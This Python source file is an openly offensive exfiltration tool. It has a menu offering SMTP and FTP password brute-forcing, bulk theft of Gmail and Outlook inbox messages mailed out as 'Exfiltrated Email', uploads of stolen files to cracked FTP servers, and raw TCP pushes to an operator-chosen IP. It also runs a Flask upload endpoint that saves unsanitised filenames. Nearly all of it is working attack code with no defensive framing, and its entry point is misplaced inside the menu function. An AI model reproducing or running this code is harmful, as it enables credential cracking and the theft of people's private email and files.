import os
import socket
import platform
from flask import Flask, request
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
import base64
import zlib
import smtplib
import imaplib
import time
import win32com.client  # Only for Windows environment
import ftplib

app = Flask(__name__)  # Create a Flask application instance

# Global variables for SMTP server and account details
smtp_server = ""
smtp_port = 587
smtp_acct = ""
smtp_passwd = ""
tgt_accts = []


# Function to send plain text email
def plain_email(subject, contents):
    """
    Sends a plain text email.

    Args:
    subject (str): The subject of the email.
    contents (str): The body of the email.
    """
    # Construct the email message
    message = f'Subject: {subject}\nFrom: {smtp_acct}\n'
    message += f'To: {", ".join(tgt_accts)}\n\n{contents}'

    # Connect to SMTP server and send the email
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_passwd)
    server.sendmail(smtp_acct, tgt_accts, message)

    # Sleep briefly before quitting the server
    time.sleep(1)
    server.quit()


# Function to brute force email account passwords
def brute_force_password(email):
    """
    Brute forces passwords for a given email account.

    Args:
    email (str): The email address to brute force.

    Returns:
    str: The found password, if successful; otherwise, None.
    """
    passwords = ['password1', 'password2', 'password3']  # Add more passwords for brute force
    for password in passwords:
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(email, password)
            server.quit()
            return password
        except smtplib.SMTPAuthenticationError:
            continue
    return None


# Function to exfiltrate emails from a Gmail account
def exfiltrate_gmail(email, password):
    """
    Exfiltrates emails from a Gmail account.

    Args:
    email (str): The Gmail address.
    password (str): The password for the Gmail account.
    """
    # Connect to Gmail IMAP server
    imap_server = "imap.gmail.com"
    mail = imaplib.IMAP4_SSL(imap_server)
    mail.login(email, password)
    mail.select('inbox')

    # Fetch all email IDs in the inbox
    result, data = mail.search(None, 'ALL')
    email_ids = data[0].split()

    # Fetch and send each email
    for email_id in email_ids:
        result, data = mail.fetch(email_id, "(RFC822)")
        raw_email = data[0][1]
        plain_email('Exfiltrated Email', raw_email)

    # Close connection
    mail.close()
    mail.logout()


# Function to exfiltrate emails from an Outlook account (Windows only)
def exfiltrate_outlook():
    """
    Exfiltrates emails from an Outlook account (Windows only).
    """
    # Connect to Outlook
    outlook = win32com.client.Dispatch("Outlook.Application")
    namespace = outlook.GetNamespace("MAPI")
    folder = namespace.Folders[1].Folders['Inbox']
    messages = folder.Items

    # Fetch and send each email
    for message in messages:
        plain_email('Exfiltrated Outlook Email', message.Body)


# Function to brute force FTP server with given usernames and passwords
def brute_force_ftp(username_dict_path, password_dict_path, ftp_server):
    """
    Brute forces FTP server using provided username and password dictionaries.

    Args:
    username_dict_path (str): Path to the file containing usernames.
    password_dict_path (str): Path to the file containing passwords.
    ftp_server (str): FTP server address.
    """
    with open(username_dict_path) as users_file:
        usernames = users_file.read().splitlines()
    with open(password_dict_path) as passwords_file:
        passwords = passwords_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP(ftp_server)
                ftp.login(username, password)
                ftp.quit()
                return username, password
            except ftplib.error_perm:
                continue
    return None, None


# Function to exfiltrate file via FTP
def ftp_upload(docpath, server, username, password):
    """
    Function to upload a file to an FTP server.

    Args:
        docpath (str): Path to the file to be uploaded.
        server (str): FTP server address.
        username (str): FTP server username.
        password (str): FTP server password.
    """
    ftp = ftplib.FTP(server)
    ftp.login(username, password)
    ftp.cwd('/pub/')
    with open(docpath, "rb") as f:
        ftp.storbinary("STOR " + os.path.basename(docpath), f)
    ftp.quit()


# Function to transmit a file to a client via TCP/IP
def ftp_transmit(document_path, client_ip):
    """
    Function to transmit a file to a client via TCP/IP.

    Args:
        document_path (str): Path to the file to be transmitted.
        client_ip (str): IP address of the client.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_port = 10000
    try:
        client.connect((client_ip, client_port))
        with open(document_path, 'rb') as f:
            client.sendall(f.read())
        print("File transmitted successfully.")
    except Exception as e:
        print(f"Failed to transmit file: {e}")
    finally:
        client.close()


# Route for uploading files via HTTP POST requests
@app.route('/upload', methods=['POST'])
def upload_file():
    """
    Function to handle file uploads via HTTP POST requests.
    """
    if 'file' not in request.files:  # Check if 'file' is not in the request files
        return 'No file part'  # Return an error message if no file is uploaded
    file = request.files['file']  # Get the uploaded file from the request
    if file.filename == '':  # Check if the filename is empty
        return 'No selected file'  # Return an error message if no file is selected
    file.save(os.path.join('uploads', file.filename))  # Save the uploaded file to the 'uploads' directory
    return 'File uploaded successfully'  # Return a success message


# Main menu function
def main_menu():
    """
    Function to display the main menu and handle user's choice.
    """
    while True:
        print("\nMain Menu:")
        print("1. Transmit file directly")
        print("2. Brute force FTP and upload file")
        print("3. Send a test email")
        print("4. Brute force an email password")
        print("5. Exfiltrate emails from a Gmail account")
        print("6. Exfiltrate emails from an Outlook account (Windows only)")
        print("7. Exit")
        choice = input("Please select an option: ")

        if choice == '1':
            file_input = input("Enter the name of the file to exfiltrate: ")
            client_ip = input("Enter the client IP address to transmit the file: ")
            ftp_transmit(file_input, client_ip)
        elif choice == '2':
            file_input = input("Enter the name of the file to exfiltrate: ")
            server_input = input("Please enter the FTP server IPv4 address: ")
            username_dict = input("Enter the path to the username dictionary: ")
            password_dict = input("Enter the path to the password dictionary: ")
            username, password = brute_force_ftp(username_dict, password_dict, server_input)
            if username and password:
                ftp_upload(file_input, server_input, username, password)
        elif choice == '3':
            sub_input = input("Please enter Test Subject Line here: ")
            content_input = input("Please enter email content here: ")
            plain_email(f'{sub_input}', f'{content_input}')
        elif choice == '4':
            brute_force_email = input("Please enter the email address to brute force: ")
            brute_force_result = brute_force_password(brute_force_email)
            if brute_force_result:
                print(f"Password found: {brute_force_result}")
            else:
                print("Password not found.")
        elif choice == '5':
            gmail_exfil_email = input("Please enter the Gmail address to exfiltrate emails from: ")
            gmail_password = input("Please enter the password for the Gmail account: ")
            exfiltrate_gmail(gmail_exfil_email, gmail_password)
        elif choice == '6':
            exfiltrate_outlook()
        elif choice == '7':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please select again.")

    if __name__ == '__main__':
        # Start the Flask web server
        app.run(host='0.0.0.0', port=8080)

